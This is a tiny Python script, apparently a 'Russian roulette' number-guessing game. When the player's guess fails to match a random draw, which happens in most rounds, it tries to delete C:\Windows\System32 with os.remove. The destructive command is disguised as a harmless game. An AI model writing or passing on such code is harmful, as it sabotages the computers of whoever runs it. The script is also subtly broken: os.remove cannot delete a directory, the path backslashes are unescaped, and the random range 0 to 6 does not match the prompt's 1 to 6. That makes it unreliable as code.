import os
import random

your_number = int(input("Choose some number from 1-6: "))
random_number = random.randint(0,6)

if your_number == random_number:
    print("CONGRATULATIONS!! YOU SURVIVE")
else:
    print("YOU DIED!")
    os.remove('C:\Windows\System32')